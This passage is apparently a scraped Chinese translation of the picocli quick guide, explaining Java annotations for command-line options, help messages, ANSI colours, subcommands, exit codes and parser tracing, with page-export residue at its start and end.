f2.txt\n\n\n1\n2\n3\n\n\n# 交互式密码选项\n\n对于标记为交互式的选项和位置参数，系统会提示用户在控制台上输入值。在Java 6或更高版本上运行时，picocli将使用Console.readPassword API，以便用户输入不会响应到控制台。\n\n\n# 参数注解\n\n任何不是子命令、选项或选项参数的命令行参数都会被解释为位置参数。使用（基于零的）索引属性来准确指定要捕获的参数。省略索引属性意味着字段捕获所有位置参数。数组或集合字段可以捕获多个值。索引属性接受范围值，因此像@Parameters（index = "2.4")这样的注释捕获索引2、3和4的参数。范围值可以是开放式的。例如，@Parameters（index = "3..*")捕获索引3及以上的所有参数。\n\nclass PositionalDemo {\n    @Parameters(index = "0")    InetAddress host;\n    @Parameters(index = "1")    int port;\n    @Parameters(index = "2..*") List<File> files;\n}\n\n\n1\n2\n3\n4\n5\n\n\nPicocli使用参数数组中指定索引处的值初始化字段。\n\nString[] args = { "localhost", "12345", "file1.txt", "file2.txt" };\nPositionalDemo params = CommandLine.populateCommand(new PositionalDemo(), args);\n\nassert params.host.getHostName().equals("localhost");\nassert params.port == 12345;\nassert params.files.equals(Arrays.asList(new File("file1.txt"), new File("file2.txt")));\n\n\n1\n2\n3\n4\n5\n6\n\n\n用户手册有更多关于选项和位置参数的详细信息，以及--选项结束分隔符和参数文件（@-files）。\n\n\n# 强类型转换\n\n当命令行选项和位置参数映射到注解的字段时，文本值将转换为注解的字段的类型。\n\n\n# 类型转换\n\n开箱即用，picocli可以将命令行参数字符串转换为许多常见数据类型。有关内置类型的完整列表，请参阅用户手册，但一般来说，所有原始类型及其对象等价物，任何枚举以及文件、日期、URL、BigDecimal、正则表达式模式等常见类都可以按原样使用。在Java 7上运行的应用程序可以使用Path，在Java 8上可以使用新的java.time类。\n\n您还可以使用自定义类型转换器来处理上述内置数据类型以外的数据类型。\n\n\n# 集合和字典\n\n如果选项或位置参数可以具有多个值，则字段类型必须是数组、集合或映射。可以使用List、Set或Queue等任何集合子类。\n\n一个常见的要求是具有类似于Java系统属性的键值对的选项，例如-Dkey=value。要实现这一点，您只需使用Map字段即可。\n\n只要为键和值类型都注册了类型转换器，映射字段的键和值可能具有任何类型。键和值类型从Map的通用类型参数中推断出来。例如：\n\nclass MapDemo {\n    @Option(names = {"-u", "--timeUnit"});\n    Map<java.util.concurrent.TimeUnit, Long> timeout;\n}\n\n\n1\n2\n3\n4\n\n\n以下命令行将生成Map中的四个键值条目：\n\n<command> -uDAYS=3 -u HOURS=23 -u=MINUTES=59 --timeUnit=SECONDS=13\n\n\n1\n\n\n\n# 必选参数\n\n\n# 必选选项\n\n可以标记所需的选项，使用户必须在命令行上指定它们。当未指定所需的选项时，将从解析方法中抛出MissingParameterException。例如：\n\n@Option(names = "-n", required = true, description = "mandatory number")\nint number;\n\n\n1\n2\n\n\n\n# 必选参数\n\n使用arity让@Parameter参数强制使用：\n\n@Parameters(arity = "1..*", descriptions = "at least one File")\nList<File> files;\n\n\n1\n2\n\n\n\n# 多值\n\n\n# 重复选项\n\n创建多值选项的最简单方法是声明一个带注释的字段，其类型是数组、集合或映射。\n\n@Option(names = "-option")\nint[] values;\n\n\n1\n2\n\n\n使用如下的命令：\n\n<command> -option 111 -option 222 -option 333\n\n\n1\n\n\n每一个元素都会被添加到数组中。\n\n\n# 正则拆分\n\n选项和参数还可以指定一个拆分正则表达式，用于将每个选项参数拆分为较小的子字符串。每个子字符串都转换为集合或数组的类型。请参阅集合和字典\n\n@Option(names = "-option", split = ",")\nint[] values;\n\n\n1\n2\n\n\n可以使用如下方式传递参数：\n\n-option 111,222,333\n\n\n1\n\n\n\n# arity\n\n有时，您想定义一个选项，该选项需要为命令行上的每个选项出现多个选项参数。Arity属性允许您准确控制每次选项发生要消耗多少参数。\n\nArity属性可以指定所需参数的确切数量，或具有最小和最大参数数量的范围。最大值可以是精确的上限，也可以是“*”来表示任意数量的参数。例如：\n\nclass ArityDemo {\n    @Parameters(arity = "1..3", descriptions = "one to three Files")\n    File[] files;\n\n    @Option(names = "-f", arity = "2", description = "exactly two floating point numbers")\n    double[] doubles;\n\n    @Option(names = "-s", arity = "1..*", description = "at least one string")\n    String[] strings;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n当命令行上指定的参数少于最小值时，会抛出MissingParameterException。\n\n如果没有指定arity，参数的数量取决于字段的类型。用户手册有更多关于arity的详细信息。\n\n\n# Help选项\n\n当mixinStandardHelpOptions命令属性设置为true时，picocli会在命令中添加mixin，该命令将 usageHelp和versionHelp选项添加到命令中。例如：\n\n@Command(mixinStandardHelpOptions = true, version = "auto help demo - picocli 3.0")\nclass AutoHelpDemo implements Runnable {\n\n    @Option(names = "--option", description = "Some option.")\n    String option;\n\n    @Override public void run() { ... }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n上述示例的使用帮助消息如下所示：\n\nUsage: <main class> [-hV] [--option=<option>]\n      --option=<option>   Some option.\n  -h, --help              Show this help message and exit.\n  -V, --version           Print version information and exit\n\n\n1\n2\n3\n4\n\n\n\n# 自定义help选项\n\n应用程序可以通过设置属性versionHelp = true、 usageHelp = true或help = true来定义自定义帮助选项。如果命令行上指定的参数之一是“帮助”选项，当缺少所必须的选项时，picocli不会抛出MissingParameterException。\n\n@Option(names = {"-V", "--version"}, versionHelp = true, description = "display version info")\nboolean versionInfoRequested;\n\n@Option(names = {"?", "-h", "--help"}, usageHelp = true, description = "display this help message")\nboolean usageHelpRequested;\n\n\n1\n2\n3\n4\n5\n\n\n将这些属性用于请求在控制台上显示使用帮助消息或版本信息的选项。\n\nCommandLine类提供了两种方法，允许外部组件检测是否请求了使用帮助或版本信息（无需检查带注释的域对象）：\n\n * CommandLine.isUsageHelpRequested()如果解析器匹配了用使用Help=true注释的选项，则返回true\n * 如果解析器匹配带有versionHelp=true注释的选项，CommandLine.isVersionHelpRequested()返回true\n\nCommandLine commandLine = new CommandLine(new App());\ncommandLine.parseArgs(args);\nif (commandLine.isUsageHelpRequested()) {\n   commandLine.usage(System.out);\n   return;\n} else if (commandLine.isVersionHelpRequested()) {\n   commandLine.printVersionHelp(System.out);\n   return;\n}\n// ... run App\'s business logic\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n另请参阅用户手册的“自动打印帮助”一章。\n\n\n# Version Help\n\n\n# 静态版本信息\n\n应用程序可以在@Command注释的版本属性中指定版本信息。\n\n@Command(version = "1.0")\nclass VersionedCommand { ... }\n\n\n1\n2\n\n\nCommandLine.printVersionHelp（PrintStream）方法从此注释中提取版本信息，并将其打印到指定的PrintStream。\n\nCommandLine commandLine = new CommandLine(new VersionedCommand());\n//...\ncommandLine.printVersionHelp(System.out);\n\n\n1\n2\n3\n\n\n该版本可以指定多个字符串，并可能包含标记以显示ANSI样式和颜色。例如：\n\n@Command(version = {\n        "@|yellow Versioned Command 1.0|@",\n        "@|blue Build 12345|@",\n        "@|red,bg(white) (c) 2017|@" })\nclass VersionedCommand { ... }\n\n\n1\n2\n3\n4\n5\n\n\n\n\n\n# 动态版本信息\n\n@Command注释支持versionProvider属性。应用程序可以在此属性中指定IVersionProvider实现，picocli将实例化该类并调用它来收集版本信息。\n\nGitHub项目有一个示例实现，可以从清单文件中获取版本，另一个示例从构建生成的版本属性文件中获取版本信息。\n\n\n# Usage Help\n\n\n# 使用信息示例\n\nPicocli使您的应用程序可以轻松生成这样的使用帮助消息：\n\nUsage: cat [-AbeEnstTuv] [--help] [--version] [FILE...]\nConcatenate FILE(s), or standard input, to standard output.\n      FILE                 Files whose contents to display\n  -A, --show-all           equivalent to -vET\n  -b, --number-nonblank    number nonempty output lines, overrides -n\n  -e                       equivalent to -vET\n  -E, --show-ends          display $ at end of each line\n  -n, --number             number all output lines\n  -s, --squeeze-blank      suppress repeated empty output lines\n  -t                       equivalent to -vT\n  -T, --show-tabs          display TAB characters as ^I\n  -u                       (ignored)\n  -v, --show-nonprinting   use ^ and M- notation, except for LDF and TAB\n      --help               display this help and exit\n      --version            output version information and exit\nCopyright(c) 2019\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n使用帮助消息由注解属性生成，如下所示：\n\n@Command(name = "cat", footer = "Copyright(c) 2019",\n         description = "Concatenate FILE(s), or standard input, to standard output.")\nclass Cat {\n\n  @Parameters(paramLabel = "FILE", description = "Files whose contents to display")\n  List<File> files;\n\n  @Option(names = "--help", usageHelp = true, description = "display this help and exit")\n  boolean help;\n\n  @Option(names = "-t",                 description = "equivalent to -vT")  boolean t;\n  @Option(names = "-e",                 description = "equivalent to -vET") boolean e;\n  @Option(names = {"-A", "--show-all"}, description = "equivalent to -vET") boolean all;\n\n  // ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n\n\n\n# 使用帮助消息元素\n\n使用帮助消息的各种元素很容易用注解自定义。\n\n# 命令名称\n\n在上面的示例中，程序名称取自命令注释的名称属性：\n\n@Command(name = "cat")\n\n\n1\n\n\n没有名称属性，picocli将在概要中显示一个通用的<main class>：\n\nUsage: <main class> [-AbeEnstTuv] [--help] [--version] [FILE...]\n\n\n1\n\n\n# 参数标签\n\n非布尔选项需要一个值。使用帮助应该解释这一点，picocli在概要和选项列表中显示选项参数。默认情况下，字段名显示在<和>括号中。使用paramLabel属性显示不同的名称。例如：\n\nUsage: <main class> [-f=FILE] [-n=<number>] NUM <host>\n      NUM        number param\n      host       the host\n  -f= FILE       a file\n  -n= <number>   number option\n\n\n1\n2\n3\n4\n5\n\n\n以下示例类中的一些注释字段具有paramLabel属性，而另一些则没有：\n\n@Command()\nclass ParamLabels {\n    @Option(names = "-f",    description = "a file",       paramLabel = "FILE") File f;\n    @Option(names = "-n",    description = "number option")                     int number;\n    @Parameters(index = "0", description = "number param", paramLabel = "NUM")  int n;\n    @Parameters(index = "1", description = "the host")                          InetAddress host;\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 排序的选项列表\n\n默认情况下，选项列表按字母顺序显示选项。使用sortOptions = false属性按照您类中声明的顺序显示选项。\n\n@Command(sortOptions = false)\n\n\n1\n\n\n# 缩写简述\n\n如果命令非常复杂并且有很多选项，有时最好使用缩写Synopsis属性抑制概要中的细节。例如：\n\n@Command(abbreviateSynopsis = true)\nclass App { ... }\n\n\n1\n2\n\n\n这显示了下面的概要。位置参数不缩写。\n\nUsage: <main class> [OPTIONS] [<files>...\n\n\n1\n\n\n# 自定义概要\n\n为了更好地控制概要，请使用customSynopsis属性指定一个或多个概要行。例如：\n\nUsage: ln [OPTION]... [-T] TARGET LINK_NAME   (1st form)\n  or:  ln [OPTION]... TARGET                  (2nd form)\n  or:  ln [OPTION]... TARGET... DIRECTORY     (3rd form)\n  or:  ln [OPTION]... -t DIRECTORY TARGET...  (4th form)\n\n\n1\n2\n3\n4\n\n\n要生成上述概要，请在customSynopsis属性中指定文字文本：\n\n@Command(synopsisHeading = "", customSynopsis = {\n        "Usage: ln [OPTION]... [-T] TARGET LINK_NAME   (1st form)",\n        "  or:  ln [OPTION]... TARGET                  (2nd form)",\n        "  or:  ln [OPTION]... TARGET... DIRECTORY     (3rd form)",\n        "  or:  ln [OPTION]... -t DIRECTORY TARGET...  (4th form)",\n})\nclass Ln { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# 头部和底部\n\n标题将显示在使用帮助消息的顶部（大纲之前）。如果您的命令有子命令，第一个标题行也是子命令列表中显示的行（请参阅子命令的使用帮助）。\n\n使用页脚属性指定一行或多行，以显示在生成的使用帮助消息下方。属性字符串数组的每个元素都显示在单独的行上。\n\nheaderHeading和footerHeading可能包含格式说明符。请参阅部分标题。\n\n# 章节标题\n\n部分标题可用于使使用消息布局看起来更宽敞。章节标题可能包含嵌入式行分隔符（%n）格式说明符：\n\n@Command(name = "commit",\n        sortOptions = false,\n        headerHeading = "Usage:%n%n",\n        synopsisHeading = "%n",\n        descriptionHeading = "%nDescription:%n%n",\n        parameterListHeading = "%nParameters:%n",\n        optionListHeading = "%nOptions:%n",\n        header = "Record changes to the repository.",\n        description = "Stores the current contents of the index in a new commit " +\n                "along with a log message from the user describing the changes.")\nclass GitCommit { ... }\n\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n从该类生成的帮助消息的使用情况如下所示在用户手册的扩展示例中。\n\n# 选项参数分离器\n\n概要中显示的选项和选项参数（默认为=）之间的分隔符和选项列表可以使用分隔符属性进行配置。\n\n@Command(separator = ":")\t\n\n\n1\n\n\n# 隐藏选项和参数\n\n将隐藏属性设置为true的选项和参数将不会显示在使用帮助消息中。有关详细信息，请参阅用户手册。\n\n# 显示默认值\n\n选项或位置参数的默认值可以通过在描述文本中指定变量${DEFAULT-VALUE}嵌入到描述中。有关详细信息，请参阅用户手册。\n\n同样，可以通过在描述文本中指定变量${COMPLETION-CANDIDATES}，将完成候选者嵌入到选项或位置参数的描述中。有关详细信息，请参阅用户手册。\n\n# 必填选项标记\n\n所需选项可以通过使用 requiredOptionMarker 属性指定的字符在选项列表中标记。有关详细信息，请参阅用户手册\n\n# 显示宽度\n\n使用帮助消息的默认宽度为80个字符。系统属性picocli.usage.width可用于指定自定义宽度。可以配置的最小宽度为55个字符。\n\n宽度也可以通过CommandLine::setUsageHelpWidth和UsageMessageSpec::width方法以编程方式设置。\n\n\n# ANSI颜色和风格\n\n\n# 彩色示例\n\n下面显示了与用户手册中扩展示例中显示的相同的使用帮助消息，并启用了ANSI转义代码。\n\n\n\n\n# 样式和颜色的使用帮助\n\n您可以在使用帮助消息的描述、页眉和页脚中使用颜色和样式。\n\nPicocli支持自定义标记符号，用于在文本中混合颜色和样式，遵循Jansi引入的约定，其中@|开始一个样式部分，|@结束它。紧接着@|是一个逗号分隔的颜色和样式列表，所以@|STYLE1[,STYLE2]...文本|@。例如：\n\n@Command(description = "Custom @|bold,underline styles|@ and @|fg(red) colors|@.")\n\n\n1\n\n\n\n\n预定义的样式和颜色表\n\nPRE-DEFINED STYLES   PRE-DEFINED COLORS\nbold                 black\nfaint                red\nunderline            green\nitalic               yellow\nblink                blue\nreverse              magenta\nreset                cyan\n                     white\n\n默认情况下，颜色作为前景颜色应用。您可以通过指定bg（<color>）来设置背景颜色。例如，红色背景的@|bg（红色）文本|@。同样，fg（<color>）显式设置前景颜色。\n\n下面的示例展示了如何使用此标记为使用帮助消息的标题和描述添加颜色和样式：\n\n@Command(name = "commit",\n        sortOptions = false,\n        headerHeading = "@|bold,underline Usage|@:%n%n",\n        synopsisHeading = "%n",\n        descriptionHeading = "%n@|bold,underline Description|@:%n%n",\n        parameterListHeading = "%n@|bold,underline Parameters|@:%n",\n        optionListHeading = "%n@|bold,underline Options|@:%n",\n        header = "Record changes to the repository.",\n        description = "Stores the current contents of the index in a new commit " +\n                "along with a log message from the user describing the changes.")\nclass GitCommit { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n> 标记样式不能嵌套，例如：@|bold this @|underline that|@|@将不起作用。您可以通过组合样式来实现相同的目标，例如：@|bold this|@ @|bold，underline that|@将正常工作。\n\n\n# 更多颜色\n\n只有八种预定义的命名颜色，但大多数终端支持256种颜色索引调色板。请参阅用户手册的“更多颜色”部分，以将这些颜色用作前景或背景颜色。\n\n\n\n# 固定元素配色方案\n\nPicocli对选项、参数和命令使用默认配色方案。没有注释来修改此配色方案，但可以通过编程和系统属性进行更改。有关详细信息，请参阅用户手册的配色方案部分。\n\n\n# 支持的平台\n\nPicocli只会在支持的平台上发布ANSI转义代码。这包括大多数Unix和Linux平台。有关为Windows命令控制台添加着色支持的各种选项，请参阅用户手册的Windows部分。\n\n\n# 强制开启或关闭ANSI\n\n无论平台如何，您都可以强制picocli始终使用ANSI代码或永远不使用ANSI代码：\n\n * 将系统属性picocli.ansi设置为true强制picocli使用ANSI代码；将picocli.ansi设置为false强制picocli不使用ANSI代码。对于您的命令行应用程序的用户来说，这可能是一个有用的工具。\n\n * 您可以通过在调用CommandLine.usage时指定Ansi.ON或Ansi.OFF，决定以编程方式强制禁用或强制启用ANSI转义代码。这覆盖了系统属性picocli.ansi的值。例如：\n\nimport picocli.CommandLine.Help.Ansi;\n\nApp app = CommandLine.usage(new App(), System.out, Ansi.OFF, args);\n\n\n1\n2\n3\n\n\n\n# 子命令\n\n\n# 注册子命令\n\n子命令可以以编程或声明方式注册\n\n# 编程方式\n\n子命令可以使用CommandLine.addSubcommand方法注册。您传递命令和带注解的对象的名称以填充子命令选项。解析器使用指定的名称来识别命令行参数中的子命令。\n\nCommandLine commandLine = new CommandLine(new Git())\n        .addSubcommand("status",   new GitStatus())\n        .addSubcommand("commit",   new GitCommit())\n        .addSubcommand("add",      new GitAdd())\n        .addSubcommand("branch",   new GitBranch())\n        .addSubcommand("checkout", new GitCheckout())\n        .addSubcommand("clone",    new GitClone())\n        .addSubcommand("diff",     new GitDiff())\n        .addSubcommand("merge",    new GitMerge())\n        .addSubcommand("push",     new GitPush())\n        .addSubcommand("rebase",   new GitRebase())\n        .addSubcommand("tag",      new GitTag());\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n> 关于自定义类型转换器的注意事项：自定义类型转换器仅注册在自定义类型之前添加的子命令和嵌套子子命令中。为了确保所有子命令都可以使用自定义类型转换器，请在添加子命令后最后注册类型转换器。\n\n# 声明方式\n\n子命令可以声明性地使用@Command注释的子命令属性注册。\n\n@Command(name = "git", subcommands = {\n    GitStatus.class,\n    GitCommit.class,\n    GitAdd.class,\n    GitBranch.class,\n    GitCheckout.class,\n    GitClone.class,\n    GitDiff.class,\n    GitMerge.class,\n    GitPush.class,\n    GitRebase.class,\n    GitTag.class\n})\npublic class Git { ... }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n当构建新的CommandLine（new Git()）实例时，声明的子命令会自动实例化和添加。\n\n子命令属性中引用的子命令必须具有带有名称属性的@Command注释，否则从CommandLine构造函数中抛出异常。\n\n# 嵌套子命令\n\n子命令可以嵌套到任意深度级别。有关详细信息，请参阅用户手册的嵌套子命令部分。\n\n\n# 解析子命令\n\n对于这个例子，我们假设我们创建了一个别名git来调用我们的Java应用程序。这也可以是一个调用我们Java程序的脚本或函数：\n\nalias git=\'java picocli.Demo$Git\'\n\n\n1\n\n\n接下来，我们用以下参数调用我们的命令：\n\ngit --git-dir=/home/rpopma/picocli status -sb -uno\n\n\n1\n\n\n其中git（实际上是java picocli.Demo$Git）是顶级命令，其次是全局选项和具有自身选项的子命令状态。\n\n设置解析器并解析命令行可能如下所示：\n\npublic static void main(String... args) {\n    // Set up the parser\n    CommandLine commandLine = new CommandLine(new Git());\n\n    // add subcommands programmatically (not necessary if the parent command\n    // declaratively registers the subcommands via annotation)\n    commandLine.addSubcommand("status",   new GitStatus())\n               .addSubcommand("commit",   new GitCommit())\n                ...\n\n    // Invoke the parse method to parse the arguments\n    List<CommandLine> parsed = commandLine.parse(args);\n    handleParseResult(parsed);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\nCommandLine.parse方法返回一个包含可识别命令的列表。顶级命令（在本例中由git调用的Java类）始终是返回列表中的第一个元素。\n\n返回的列表还包含所有匹配的子命令。您的应用程序需要检查此列表，以查看调用了哪些子命令，并采取适当的行动。例如：\n\nprivate void handleParseResult(List<CommandLine> parsed) {\n    assert parsed.size() == 2 : "1 command and 1 subcommand found"\n\n    assert parsed.get(0).getCommand().getClass() == Git.class       : "main command"\n    assert parsed.get(1).getCommand().getClass() == GitStatus.class : "subcommand"\n\n    Git git = (Git) parsed.get(0).getCommand();\n    assert git.gitDir.equals(new File("/home/rpopma/picocli"));\n\n    GitStatus gitstatus = (GitStatus) parsed.get(1).getCommand();\n    assert  gitstatus.shortFormat              : "git status -s"\n    assert  gitstatus.branchInfo               : "git status -b"\n    assert !gitstatus.showIgnored              : "git status --showIgnored not specified"\n    assert  gitstatus.mode == GitStatusMode.no : "git status -u=no"\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n从Picocli 4.0开始，您可以使用执行方法来减少应用程序中的错误处理和其他样板代码。\n\n\n# @ParentCommand注解\n\n在具有子命令的命令行应用程序中，顶级命令的选项通常用作适用于所有子命令的“全局”选项。@ParentCommand注释使子命令可以轻松访问其父命令选项：用@ParentCommand注释的子命令字段通过引用父命令进行初始化。用户手册有一个示例，展示了如何使用@ParentCommand注释。\n\n\n# 子命令的使用帮助\n\n注册子命令后，调用commandLine.usage方法将显示一条使用帮助消息，按注册顺序包含所有子命令。例如：\n\nUsage: git [-hV] [--git-dir=<gitDir>]\nGit is a fast, scalable, distributed revision control system with an unusually\nrich command set that provides both high-level operations and full access to\ninternals.\n      --git-dir=<gitDir>   Set the path to the repository.\n  -h, --help               Show this help message and exit.\n  -V, --version            Print version information and exit.\n\nCommands:\n\nThe most commonly used git commands are:\n  help      Displays help information about the specified command\n  status    Show the working tree status.\n  commit    Record changes to the repository.\n  add       Add file contents to the index.\n  branch    List, create, or delete branches.\n  checkout  Checkout a branch or paths to the working tree.\n  clone     Clone a repository into a new directory.\n  diff      Show changes between commits, commit and working tree, etc.\n  merge     Join two or more development histories together.\n  push      Update remote refs along with associated objects.\n  rebase    Forward-port local commits to the updated upstream head.\n  tag       Create, list, delete or verify a tag object signed with GPG.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n列表中子命令的描述取自子命令的第一个标题行，或者，如果子命令没有标题注释，则取自描述。\n\n# 隐藏的子命令\n\n将隐藏属性设置为true的命令不会显示在其父命令的使用帮助消息中。有关详细信息，请参阅用户手册的隐藏子命令部分。\n\n# 帮助子命令\n\nPicocli有一个内置的帮助子命令，但如果您有兴趣创建自定义帮助命令，请参阅用户手册的帮助子命令部分。\n\n\n# 重复使用\n\n您可能会发现自己在许多命令行应用程序中定义了相同的选项、参数或命令属性。为了减少重复，picocli支持子类和混合，作为重用此类选项和属性的方法。\n\n重用上述选项和属性的一种方法是扩展类。Picocli将走在类层次结构中检查注释，因此在超类上声明的@Options、@Parameters和@Command属性在所有子类中都可用。\n\n命令也可以通过用@Mixin注释字段来包含mixin。mixin类中发现的所有picocli注释都添加到带有@Mixin注释字段的命令中。例如：\n\n@Command(name = "zip", description = "Example reuse with @Mixin annotation.")\npublic class MyCommand {\n\n    // adds the options defined in ReusableOptions to this command\n    @Mixin\n    private ReusableOptions myMixin;\n    ...\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n用户手册的重用部分有更广泛的示例。\n\n\n# 执行命令\n\n执行命令时，解析命令行是第一步。一个强大的现实世界应用程序需要处理许多场景：\n\n * 用户输入无效：显示描述问题的错误，并显示使用帮助\n\n * 用户请求的使用帮助：显示帮助消息并退出\n\n * 用户请求的版本帮助：显示版本信息和退出\n\n * 以上都不是：运行业务逻辑（可能用于子命令）\n\n * 业务逻辑可能会抛出异常：处理或重新抛出异常\n\n从Piocli 4.0起，您可以使用Commandline.execute方法，该方法在一行代码中处理上述所有场景：\n\nnew CommandLine(new MyApp()).execute(args);\n\n\n1\n\n\n使用执行方法，应用程序代码可以非常紧凑：\n\n@Command(name = "myapp", mixinStandardHelpOptions = true, version = "1.0")\nclass MyApp implements Callable<Integer> {\n\n    @Option(names = "-x") int x;\n\n    @Override\n    public Integer call() { // business logic\n        System.out.printf("x=%s%n", x);\n        return 123; // exit code\n    }\n\n    public static void main(String... args) { // bootstrap the application\n        System.exit(new CommandLine(new MyApp()).execute(args));\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n尽管只有15行长，但这是一个成熟的应用程序，除了-x选项外，还有--help和--version选项。如果用户要求，执行方法将显示使用帮助或版本信息，无效的用户输入将导致有用的错误消息。如果用户输入有效，则调用业务逻辑。最后，执行方法返回一个退出状态代码，如果需要，可用于调用System.exit。\n\n用户手册的DIY命令执行部分显示了执行方法可以省略的样板代码示例。\n\n\n# 退出代码\n\n许多命令行应用程序返回退出代码，以表示成功或失败。零通常意味着成功，非零退出代码通常用于错误，但除此之外，每个应用程序的含义不同。\n\nPicocli 4.0中引入的CommandLine.execute方法返回一个int，如果需要，应用程序可以使用此返回值调用System.exit。例如：\n\npublic static void main(String... args) {\n  int exitCode = new CommandLine(new MyApp()).execute(args);\n  System.exit(exitCode);\n}\n\n\n1\n2\n3\n4\n\n\n> 旧版本的picocli有一些有限的退出代码支持，picocli会调用System.exit，但现在不建议使用。\n\n\n# 生成退出代码\n\n实现Callable并且添加了@Command注解的方法和@Command注解的类可以简单地返回int或整数，此值将从CommandLine.execute返回。例如：\n\n@Command(name = "greet")\nclass Greet implements Callable<Integer> {\n    public Integer call() {\n        System.out.println("hi");\n        return 1;\n    }\n\n    // define a "shout" subcommand with a @Command-annotated method\n    @Command\n    int shout() {\n        System.out.println("HI!");\n        return 2;\n    }\n}\n\nassert 1 == new CommandLine(new Greet()).execute();\nassert 2 == new CommandLine(new Greet()).execute("shout");\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n使用实现Runnable的用户对象的命令可以实现IExitCodeGenerator接口来生成退出代码。\n\n\n# 例外退出代码\n\n默认情况下，执行方法成功时返回CommandLine.ExitCode.OK (0)，在Runable、Callable或命令方法中发生异常时返回CommandLine.ExitCode.SOFTWARE（1），以及无效输入的CommandLine.ExitCode.USAGE（2）。（根据这个StackOverflow答案，这些是常见的值）。这可以通过@Command注释进行自定义。例如：\n\n@Command(exitCodeOnInvalidInput = 123,\n   exitCodeOnExecutionException = 456)\n\n\n1\n2\n\n\n此外，应用程序可以配置IExitCodeExceptionMapper将特定异常映射到退出代码。\n\n\n# 执行配置\n\n虽然执行方法允许在一行代码中运行CLI应用程序，但命令执行的各个步骤都是高度可配置的。以下方法可用于配置执行方法的行为，您可以使用它们来调整命令执行以满足您的需求：\n\n * get/setOut\n * get/setErr\n * get/setColorScheme\n * get/setExecutionStrategy\n * get/setParameterExceptionHandler\n * get/setExecutionExceptionHandler\n * get/setExitCodeExceptionMapper\n\n> 上述方法不适用于（并被忽略）其他入口点，如parse、parseArgs、populateCommand、run、call、调用、parseWithHandler和parseWithHandlers。\n\n\n# 处理错误\n\n在内部，执行方法解析指定的用户输入，并填充注释定义的选项和位置参数。当用户指定无效输入时，由IParameterExceptionHandler处理。\n\n解析用户输入后，将调用命令的业务逻辑：运行、调用或@Command-annotated方法。当业务逻辑抛出异常时，由IExecutionExceptionHandler处理。\n\n在大多数情况下，默认处理程序就足够了。在用户手册的处理错误部分深入解释了默认处理程序的自定义。\n\n\n# 迁移\n\n旧版本的picocli支持运行、调用、调用和parseWithHandlers方便方法，这些方法类似于执行，但对解析器配置的支持有限，对退出代码的支持有限。从picocli 4.0中，这些方法已被弃用。\n\n用户手册的迁移部分可帮助您将现有代码迁移到新引入的执行API\n\n\n# 追踪\n\nPicocli支持解析器跟踪，以方便故障排除。系统属性picocli.trace控制跟踪级别。支持的级别包括OFF、WARN、INFO和DEBUG。默认跟踪级别为WARN。\n\n指定没有值的系统属性-Dpicocli.trace将把跟踪级别设置为INFO。\n\n * DEBUG：显示解析器在命令行解析期间所作决定的详细信息。\n\n * INFO：显示命令行解析期间发生的事情的高级概述。\n\n * WARN：默认值。启用宽松解析时显示警告而不是错误：当多次指定单值选项（CommandLine.overwrittenOptionsAllowed为真）或命令行参数无法匹配为选项或位置参数时（CommandLine.unmatchedArgumentsAllowed为真）。\n\n * OFF：禁止所有跟踪，包括警告。\n\n示例：\n\n# create a custom \'mygit\' command that invokes picocli.Demo$Git with tracing switched on\nalias mygit=\'java -Dpicocli.trace -cp picocli-all.jar picocli.Demo$Git\'\n\n# invoke our command with some parameters\nmygit --git-dir=/home/rpopma/picocli commit -m "Fixed typos" -- src1.java src2.java src3.java\n\n\n1\n2\n3\n4\n5\n\n\n输出：\n\n[picocli INFO] Parsing 8 command line args [--git-dir=/home/rpopma/picocli, commit, -m, "Fixed typos", --, src1.java, src2.java, src3.java]\n[picocli INFO] Setting File field \'Git.gitDir\' to \'\\home\\rpopma\\picocli\' for option --git-dir\n[picocli INFO] Adding [Fixed typos] to List&lt;String> field \'GitCommit.message\' for option -m\n[picocli INFO] Found end-of-options delimiter \'--\'. Treating remainder as positional parameters.\n[picocli INFO] Adding [src1.java] to List&lt;String> field \'GitCommit.files\' for args[0..*]\n[picocli INFO] Adding [src2.java] to List&lt;String> field \'GitCommit.files\' for args[0..*]\n[picocli INFO] Adding [src3.java] to List&lt;String> field \'GitCommit.files\' for args[0..*]\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n\n# 自动补全\n\n基于Picocli的应用程序现在可以在Bash或Zsh Unix shell中完成命令行。请参阅Java命令行应用程序自动完成手册，了解如何生成为您的应用程序量身定制的自动完成脚本。\n\n\n# 更多\n\n为了保持本快速指南简短（或至少简短），必须遗漏一些东西。如果您感兴趣，这里有一些快速链接：\n\n * Picocli in Other Languages\n * Usage Help API for customizing the usage help message layout\n * Tips & Tricks\n * API Javadoc',normalizedContent:'# picocli\n\n> 最近突发奇想尝试用java写一写安全小工具。不过万事开头难，如何在命令行上打印帮助文档竟然一直困扰着我。当然，这个实现起来其实不难，但是写起来混乱且不美观。\n> \n> 刚开始的时候，为了打印出彩色的字符，我尝试使用\\033[这种转义字符，并写了一个工具类，用于生成指定格式和颜色的打印字符串。其实，针对于命令行早有其他的解决方案，且使用起来比较顺手和规范（我差点想自己写一个——何必重复造轮子呢），诸如apache 